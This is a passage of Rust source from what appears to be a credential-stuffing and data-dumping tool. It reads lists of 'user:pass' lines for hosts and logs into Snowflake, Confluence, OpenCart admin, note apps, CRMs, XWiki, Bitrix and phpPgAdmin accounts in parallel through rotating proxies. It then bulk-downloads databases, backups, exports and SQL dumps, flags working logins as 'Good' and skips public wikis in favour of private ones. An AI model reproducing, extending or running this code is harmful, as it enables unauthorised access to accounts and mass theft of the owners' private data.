    download_files: bool,
    export_options: SnowflakeExportOptions,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        let export_options = export_options;
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_snowflake_account(&cred, &cfg, &out, download_files, export_options).await
            {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        if !export_options.any_selected() {
                            (
                                ScanStatus::Error,
                                "Snowflake export: no categories selected (databases / warehouses / roles)"
                                    .to_string(),
                            )
                        } else {
                            (ScanStatus::Valid, detail)
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );
    Ok(())
}

pub async fn load_confluence_list_summary(path: &Path) -> Result<ConfluenceParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_confluence_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Confluence targets in {} ({} lines checked, {} skipped, {} non-confluence filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_confluence
        );
    }
    Ok(summary)
}

pub async fn download_confluence_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<ConfluenceClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        None,
        cancel,
        |cred, cfg, out, dl| {
            Box::pin(async move { download_confluence_account(&cred, &cfg, &out, dl).await })
        },
        |stats: &pma_net::ConfluenceAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() && stats.spaces > 0 {
                (ScanStatus::Valid, detail)
            } else if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    "no Confluence space list exported".to_string(),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

pub async fn load_opencart_list_summary(path: &Path) -> Result<OpencartParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_opencart_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid OpenCart admin targets in {} ({} lines checked, {} skipped, {} filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_opencart
        );
    }
    Ok(summary)
}

pub async fn download_opencart_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<OpencartClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        None,
        cancel,
        |cred, cfg, out, dl| Box::pin(async move { download_opencart_account(&cred, &cfg, &out, dl).await }),
        |stats: &pma_net::OpencartAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    "no OpenCart store export downloaded".to_string(),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

pub async fn load_workflowy_list_summary(path: &Path) -> Result<WorkflowyParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_workflowy_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Workflowy targets in {} ({} lines checked, {} skipped, {} filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_workflowy
        );
    }
    Ok(summary)
}

pub async fn download_workflowy_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<WorkflowyClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        None,
        cancel,
        |cred, cfg, out, dl| Box::pin(async move { download_workflowy_account(&cred, &cfg, &out, dl).await }),
        |stats: &NoteAppAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    format!("{} export: no files written", stats.service),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

pub async fn load_roamresearch_list_summary(path: &Path) -> Result<RoamresearchParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_roamresearch_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Roam Research targets in {} ({} lines checked, {} skipped, {} filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_roam
        );
    }
    Ok(summary)
}

pub async fn download_roamresearch_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<RoamresearchClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        None,
        cancel,
        |cred, cfg, out, dl| Box::pin(async move { download_roamresearch_account(&cred, &cfg, &out, dl).await }),
        |stats: &NoteAppAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    format!("{} export: no files written", stats.service),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

pub async fn load_secondbrain_list_summary(path: &Path) -> Result<SecondbrainParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_secondbrain_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Second Brain targets in {} ({} lines checked, {} skipped, {} filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_secondbrain
        );
    }
    Ok(summary)
}

pub async fn download_secondbrain_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<SecondbrainClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        None,
        cancel,
        |cred, cfg, out, dl| Box::pin(async move { download_secondbrain_account(&cred, &cfg, &out, dl).await }),
        |stats: &NoteAppAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    format!("{} export: no files written", stats.service),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

pub async fn load_appflowy_list_summary(path: &Path) -> Result<AppflowyParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_appflowy_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid AppFlowy targets in {} ({} lines checked, {} skipped, {} filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_appflowy
        );
    }
    Ok(summary)
}

pub async fn download_appflowy_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<AppflowyClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        None,
        cancel,
        |cred, cfg, out, dl| Box::pin(async move { download_appflowy_account(&cred, &cfg, &out, dl).await }),
        |stats: &NoteAppAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    format!("{} export: no files written", stats.service),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

pub async fn load_note_export_list_summary(
    service: NoteExportService,
    path: &Path,
) -> Result<NoteExportParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_note_export_list_summary(service, &content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid {} targets in {} ({} lines checked, {} skipped, {} filtered)",
            service.label(),
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_wrong_host
        );
    }
    Ok(summary)
}

pub async fn download_note_export_exports(
    service: NoteExportService,
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<NoteExportClientConfig>,
    threads: usize,
    download_files: bool,
    proxy: Option<String>,
    proxy_list: Option<Arc<Vec<String>>>,
    on_progress: Option<ProgressCallback>,
    pause: Option<Arc<AtomicBool>>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let proxy_mgr = proxy_manager_from_run(proxy.as_deref(), proxy_list.as_ref());
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        pause,
        cancel,
        move |cred, cfg, out, dl| {
            let svc = service;
            let pm = proxy_mgr.clone();
            Box::pin(async move {
                let spec = note_app_spec(svc);
                let runtime = Arc::new(NoteRuntime::new(
                    NoteRuntimeConfig::from_legacy(cfg.timeout, cfg.insecure),
                    spec.user_agent,
                    pm,
                )?);
                download_note_export_with_runtime(svc, &cred, runtime, &out, dl).await
            })
        },
        |stats: &NoteAppAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    format!("{} export: no files written", stats.service),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

pub async fn load_crm_export_list_summary(
    service: CrmExportService,
    path: &Path,
) -> Result<CrmExportParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_crm_export_list_summary(service, &content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid {} targets in {} ({} lines checked, {} skipped, {} filtered)",
            service.label(),
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_wrong_host
        );
    }
    Ok(summary)
}

pub async fn download_crm_export_exports(
    service: CrmExportService,
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<NoteExportClientConfig>,
    threads: usize,
    download_files: bool,
    proxy: Option<String>,
    proxy_list: Option<Arc<Vec<String>>>,
    on_progress: Option<ProgressCallback>,
    pause: Option<Arc<AtomicBool>>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let proxy_mgr = proxy_manager_from_run(proxy.as_deref(), proxy_list.as_ref());
    simple_account_exports(
        creds,
        output,
        config,
        threads,
        download_files,
        on_progress,
        pause,
        cancel,
        move |cred, cfg, out, dl| {
            let svc = service;
            let pm = proxy_mgr.clone();
            Box::pin(async move {
                let spec = crm_app_spec(svc);
                let runtime = Arc::new(NoteRuntime::new(
                    NoteRuntimeConfig::from_legacy(cfg.timeout, cfg.insecure),
                    spec.user_agent,
                    pm,
                )?);
                download_crm_export_with_runtime(svc, &cred, runtime, &out, dl).await
            })
        },
        |stats: &NoteAppAccountStats, files, dl| {
            let detail = stats.detail_line();
            if dl && files.is_empty() {
                (
                    ScanStatus::Error,
                    format!("{} export: no files written", stats.service),
                )
            } else if dl {
                (ScanStatus::Valid, detail)
            } else {
                (ScanStatus::Valid, format!("check ok — {detail}"))
            }
        },
    )
    .await
}

async fn simple_account_exports<C, S, D, G>(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<C>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    pause: Option<Arc<AtomicBool>>,
    cancel: Option<Arc<AtomicBool>>,
    download_one: D,
    status_for: G,
) -> Result<()>
where
    C: Send + Sync + 'static,
    S: Send + 'static,
    D: Fn(
            Credential,
            Arc<C>,
            PathBuf,
            bool,
        ) -> std::pin::Pin<
            Box<dyn std::future::Future<Output = Result<(S, Vec<(PathBuf, u64)>)>> + Send>,
        > + Send
        + Sync
        + Clone
        + 'static,
    G: Fn(&S, &[(PathBuf, u64)], bool) -> (ScanStatus, String) + Send + Sync + Clone + 'static,
{
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        wait_while_paused(&pause, &cancel).await;
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let pause_task = pause.clone();
        let target_line = cred.display_line();
        let download_one = download_one.clone();
        let status_for = status_for.clone();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            wait_while_paused(&pause_task, &cancel_task).await;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_one(cred.clone(), cfg, out.clone(), download_files).await {
                Ok((stats, files)) => {
                    let (status, message) = status_for(&stats, &files, download_files);
                    let bytes: u64 = files.iter().map(|(_, n)| *n).sum();
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files { Some(bytes) } else { None },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(bytes),
                        });
                    }
                }
                Err(err) => {
                    let msg = err.to_string();
                    let status = scan_status_from_export_error(&msg);
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(msg.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: msg,
                        });
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );
    Ok(())
}

pub async fn load_mixed_list_summary(path: &Path) -> Result<MixedParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_mixed_list_summary(&content);
    if summary.targets.is_empty() && summary.unclassified_lines.is_empty() {
        anyhow::bail!(
            "no lines in {} ({} empty/comment lines skipped)",
            path.display(),
            summary.skipped
        );
    }
    Ok(summary)
}

pub async fn load_webapp_list_summary(
    kind: AddServiceKind,
    path: &Path,
) -> Result<ServiceParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_service_list_summary(kind, &content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid {} targets in {} ({} lines checked, {} skipped, {} filtered)",
            kind.label(),
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_target
        );
    }
    if summary.filtered_non_target > 0 {
        info!(
            "{} list {}: filtered {} non-target lines",
            kind.label(),
            path.display(),
            summary.filtered_non_target
        );
    }
    Ok(summary)
}

pub async fn download_webapp_exports(
    kind: AddServiceKind,
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<WebappClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_webapp_account(kind, &cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if download_files {
                        if files.is_empty() && stats.export_files == 0 {
                            (
                                ScanStatus::Valid,
                                format!("check ok — {detail} (no export files)"),
                            )
                        } else {
                            (ScanStatus::Valid, detail)
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len(),
                            bytes: Some(stats.bytes),
                        });
                    }
                }
                Err(err) => {
                    let err_text = format!("{err:#}");
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err_text.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err_text,
                        });
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;
    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );
    Ok(())
}

pub async fn load_xwiki_list_summary(path: &Path) -> Result<XWikiParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_xwiki_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid XWiki targets in {} ({} lines checked, {} skipped, {} non-xwiki filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_xwiki
        );
    }
    if summary.filtered_non_xwiki > 0 {
        info!(
            "XWiki list {}: filtered {} lines (not a tenant wiki host or bad user:pass shape)",
            path.display(),
            summary.filtered_non_xwiki
        );
    }
    Ok(summary)
}

pub async fn load_xwiki_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_xwiki_list_summary(path).await?.credentials)
}

pub async fn download_xwiki_exports(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<XWikiClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_xwiki_content(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let (status, message) = if !is_xwiki_wiki_target(&cred) {
                        (
                            ScanStatus::Error,
                            "not a private XWiki wiki (public/community site or bad line format)"
                                .to_string(),
                        )
                    } else if !stats.authenticated {
                        (
                            ScanStatus::Error,
                            "XWiki REST login not verified".to_string(),
                        )
                    } else if download_files {
                        let has_output =
                            !files.is_empty() || stats.attachments > 0 || stats.pages_exported > 0;
                        if has_output {
                            (ScanStatus::Valid, detail)
                        } else {
                            (
                                ScanStatus::Error,
                                "XWiki login ok but no pages or attachments exported".to_string(),
                            )
                        }
                    } else {
                        (ScanStatus::Valid, format!("check ok — {detail}"))
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        if result.status == ScanStatus::Valid {
                            callback(ProgressEvent::Good {
                                target: target_line.clone(),
                                detail: message,
                                bytes: if download_files {
                                    Some(stats.bytes)
                                } else {
                                    None
                                },
                            });
                        }
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: files.len() + stats.attachments,
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("XWIKI {} — {}", target_line, stats.detail_line());
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("XWIKI FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_bitrix_list_summary(path: &Path) -> Result<BitrixParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_bitrix_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid Bitrix targets in {} ({} lines checked, {} skipped, {} non-bitrix urls filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_bitrix
        );
    }
    if summary.filtered_non_bitrix > 0 {
        info!(
            "Bitrix list {}: filtered {} lines without `bitrix` in path",
            path.display(),
            summary.filtered_non_bitrix
        );
    }
    Ok(summary)
}

pub async fn load_bitrix_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_bitrix_list_summary(path).await?.credentials)
}

pub async fn download_bitrix_backups(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<BitrixClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match download_personal_backups(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let detail = stats.detail_line();
                    let message = if download_files {
                        detail
                    } else {
                        format!("check ok — {detail}")
                    };
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Valid,
                        message: Some(message.clone()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::Good {
                            target: target_line.clone(),
                            detail: message,
                            bytes: if download_files {
                                Some(stats.bytes)
                            } else {
                                None
                            },
                        });
                        callback(ProgressEvent::DumpComplete {
                            target: target_line.clone(),
                            files: if download_files {
                                files.len().max(1)
                            } else {
                                0
                            },
                            bytes: Some(stats.bytes),
                        });
                    } else {
                        info!("BITRIX {} — {}", target_line, stats.detail_line());
                    }
                }
                Err(err) => {
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Error,
                        message: Some(err.to_string()),
                        databases: Vec::new(),
                    };
                    let _ = record_scan_result(&out, &result).await;
                    emit_scan_result(&cb, &result);
                    if let Some(ref callback) = cb {
                        callback(ProgressEvent::DumpFailed {
                            target: target_line.clone(),
                            error: err.to_string(),
                        });
                    } else {
                        warn!("BITRIX FAIL {} — {}", target_line, err);
                    }
                }
            }
        }));
    }

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

pub async fn load_phppgadmin_list_summary(path: &Path) -> Result<PhpPgAdminParseSummary> {
    let content = read_list_file(path).await?;
    let summary = parse_phppgadmin_list_summary(&content)?;
    if summary.credentials.is_empty() {
        anyhow::bail!(
            "no valid phpPgAdmin/pgAdmin targets in {} ({} lines checked, {} skipped, {} non-pgadmin urls filtered)",
            path.display(),
            summary.total_lines,
            summary.skipped,
            summary.filtered_non_pgadmin
        );
    }
    if summary.filtered_non_pgadmin > 0 {
        info!(
            "phpPgAdmin list {}: filtered {} lines without phpPgAdmin/pgAdmin in url",
            path.display(),
            summary.filtered_non_pgadmin
        );
    }
    Ok(summary)
}

pub async fn load_phppgadmin_list(path: &Path) -> Result<Vec<Credential>> {
    Ok(load_phppgadmin_list_summary(path).await?.credentials)
}

pub async fn download_phppgadmin_dumps(
    creds: Vec<Credential>,
    output: PathBuf,
    config: Arc<PhpPgAdminClientConfig>,
    threads: usize,
    download_files: bool,
    on_progress: Option<ProgressCallback>,
    cancel: Option<Arc<AtomicBool>>,
) -> Result<()> {
    let error_log = init_run_output_dir_errors_only(&output).await?;
    notify_error_log(&error_log, on_progress.as_ref());
    let semaphore = Arc::new(Semaphore::new(threads.max(1)));
    let mut handles = Vec::with_capacity(creds.len());

    for cred in creds {
        if cancelled(&cancel) {
            break;
        }
        let permit = semaphore.clone().acquire_owned().await?;
        let cfg = config.clone();
        let out = output.clone();
        let cb = on_progress.clone();
        let cancel_task = cancel.clone();
        let target_line = cred.display_line();
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if cancelled(&cancel_task) {
                return;
            }
            if let Some(ref callback) = cb {
                callback(ProgressEvent::DumpStarted {
                    target: target_line.clone(),
                });
            }
            match phppgadmin_fetch_personal_dumps(&cred, &cfg, &out, download_files).await {
                Ok((stats, files)) => {
                    let site_dir = cred.account_site_output_dir(&out, "phppgadmin");
                    let has_files_on_disk = site_tree_has_files(&site_dir).await;
                    let good = if download_files {
                        has_files_on_disk || (!files.is_empty() && stats.bytes > 0)
                    } else {
                        stats.databases > 0
                    };
                    if !good {
                        // #region agent log
                        agent_log(
                            "H2",
                            "app/lib.rs:download_phppgadmin_dumps",
                            "ok but not good",
                            &format!(
                                r#"{{"host":"{}","files_len":{},"bytes":{},"has_files_on_disk":{},"site_dir":"{}"}}"#,
                                json_escape(cred.url.host_str().unwrap_or("?")),
                                files.len(),
                                stats.bytes,
                                has_files_on_disk,
                                json_escape(&site_dir.display().to_string())
                            ),
                        );
                        // #endregion
                        remove_site_tree_if_no_files(&site_dir).await;
                        let err = if download_files {
                            "phpPgAdmin: login ok but no SQL dumps saved"
                        } else {
                            "phpPgAdmin: check ok but no databases visible"
                        };
                        let result = ScanResult {
                            credential: cred.clone(),
                            status: ScanStatus::Error,
                            message: Some(err.to_string()),
                            databases: Vec::new(),
                        };
                        let _ = record_mass_sql_outcome(&out, &result, &cb).await;
                        return;
                    }

                    let detail = stats.detail_line();
                    let login_at = Local::now().format("%Y-%m-%d %H:%M:%S");
                    let good_detail = format!("login ok at {login_at}; {detail}");
                    let result = ScanResult {
                        credential: cred.clone(),
                        status: ScanStatus::Valid,
                        message: Some(good_detail.clone()),
                        databases: Vec::new(),
                    };
                    emit_scan_result(&cb, &result);
